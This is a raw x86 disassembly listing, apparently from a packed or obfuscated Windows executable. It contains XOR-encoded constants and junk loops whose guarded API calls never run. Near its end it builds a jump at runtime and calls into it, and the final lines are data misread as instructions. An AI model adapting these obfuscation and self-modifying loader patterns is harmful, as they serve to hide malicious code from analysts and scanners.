  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x43354f,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43361b
  40d8a4:	add    esi,DWORD PTR ds:0x4335e3
  40d8aa:	mov    DWORD PTR ds:0x43361b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x433547
  40d8bc:	and    eax,DWORD PTR ds:0x4335af
  40d8c2:	mov    ds:0x433547,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x433553,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x43365b,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x43365b
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x43365b,edi
  40d8f8:	cmp    DWORD PTR ds:0x43365b,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x43365b,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x4335a7,0x43365f
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x433553
  40d93b:	and    edi,DWORD PTR ds:0x43362f
  40d941:	mov    DWORD PTR ds:0x433553,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x4335a7,0x13
  40d953:	cmp    DWORD PTR ds:0x4335a7,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x4335a7,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x4335a7,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x4335a7
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x4335a7,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x4335a7
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x4335a7,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x43354f
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x4335db,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x4335f3,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43359f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x43355f,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x433663,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x4335eb,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x43354f
  40da21:	sub    DWORD PTR ds:0x433567,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x43355b,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x43362f,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x43362f
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x43362f,ecx
  40da55:	cmp    DWORD PTR ds:0x43362f,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x43362f,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x43362f,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x43362f
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x43362f,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x43365b,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433597,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433597
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433597,ecx
  40dabd:	cmp    DWORD PTR ds:0x433597,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433597,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x433874
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x433563,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x4335a7,0x43354f
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x433657,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x433543,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x433547,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x4335cf
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x433563,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43361f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43361f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43361f,ecx
  40db80:	cmp    DWORD PTR ds:0x43361f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43361f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43361f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43359f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x433627,0x12
  40dbc3:	cmp    DWORD PTR ds:0x433627,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x433627,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x433667
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x433627,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x433627
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x433627,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x433627
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x433627,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433617,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433617
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433617,eax
  40dc3b:	cmp    DWORD PTR ds:0x433617,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x433775
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433617,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433617
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433617,eax
  40dc72:	cmp    DWORD PTR ds:0x433617,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x43354b,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x433547,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x433673,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43359f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43359f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43359f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43359f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43359f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43359f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43359f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43359f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x4335a7
  40dd0d:	sbb    edx,DWORD PTR ds:0x433667
  40dd13:	mov    DWORD PTR ds:0x4335a7,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x43366b
  40dd26:	or     DWORD PTR ds:0x43361b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x4335b3
  40dd3a:	and    DWORD PTR ds:0x43361f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x433557,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x43354f,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x43355b,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x43366b,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43361b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x43355b,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x4335a7,0x43362f
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x43365f,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43359f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x43355b,0x43362f
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x43354b
  40ddeb:	or     DWORD PTR ds:0x4335df,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x43365b,0x4335b3
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x433663,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x4335ef,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x4335ab,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x4335ab
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x4335ab,edx
  40de3a:	cmp    DWORD PTR ds:0x4335ab,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x4335ab,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x433667,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43361b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x433657,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x433663
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433597,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x4335e7,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x433557,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x4335df
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x43362b,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x4335af
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433617,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x433627,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x433627
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x433627,ecx
  40e244:	cmp    DWORD PTR ds:0x433627,0xa
  40e24b:	jne    0x40e25f
  40e251:	push   0x15e8
  40e256:	push   DWORD PTR [ebp-0x10]
  40e259:	call   DWORD PTR ds:0x4120d0
  40e25f:	cmp    DWORD PTR ds:0x433627,0x9
  40e266:	jne    0x40e279
  40e26c:	mov    ecx,DWORD PTR ds:0x433627
  40e272:	inc    ecx
  40e273:	mov    DWORD PTR ds:0x433627,ecx
  40e279:	cmp    DWORD PTR ds:0x433627,0x14
  40e280:	jb     0x40e237
  40e286:	or     ecx,eax
  40e288:	mov    eax,DWORD PTR [ebp-0x4]
  40e28b:	mov    ecx,DWORD PTR [ebp+0xc]
  40e28e:	sbb    DWORD PTR ds:0x43365b,0x433547
  40e298:	xor    eax,edi
  40e29a:	add    eax,esi
  40e29c:	cmp    eax,ecx
  40e29e:	je     0x40eaa5
  40e2a4:	and    eax,0x1e6e
  40e2a9:	mov    eax,DWORD PTR [ebp-0x4]
  40e2ac:	and    DWORD PTR ds:0x4335eb,0x0
  40e2b6:	mov    edx,DWORD PTR ds:0x4335eb
  40e2bc:	inc    edx
  40e2bd:	mov    DWORD PTR ds:0x4335eb,edx
  40e2c3:	cmp    DWORD PTR ds:0x4335eb,0x20
  40e2ca:	jne    0x40e2e0
  40e2d0:	push   0x433874
  40e2d5:	push   0x433874
  40e2da:	call   DWORD PTR ds:0x4121bc
  40e2e0:	cmp    DWORD PTR ds:0x4335eb,0x1f
  40e2e7:	jb     0x40e2b6
  40e2ed:	xor    eax,edi
  40e2ef:	add    eax,esi
  40e2f1:	push   eax
  40e2f2:	push   DWORD PTR [ebp-0x8]
  40e2f5:	push   DWORD PTR [ebp-0x4]
  40e2f8:	mov    edx,DWORD PTR ds:0x413b16
  40e2fe:	call   0x40f9cd
  40e303:	mov    ecx,DWORD PTR ds:0x413b16
  40e309:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e30f:	jmp    0x40e6d5
  40e314:	cmp    BYTE PTR [ebp*1+0x6055fdb9],dh
  40e31b:	mov    ebp,0x9445ce55
  40e320:	and    al,0x73
  40e322:	inc    eax
  40e323:	mov    edx,0x7c7ca4c5
  40e328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e329:	jns    0x40e3a7
  40e32b:	jl     0x40e2c0
  40e32d:	pop    esi
  40e32e:	std    
  40e32f:	jmp    ebx
  40e331:	mov    ecx,0x4abdb7b4
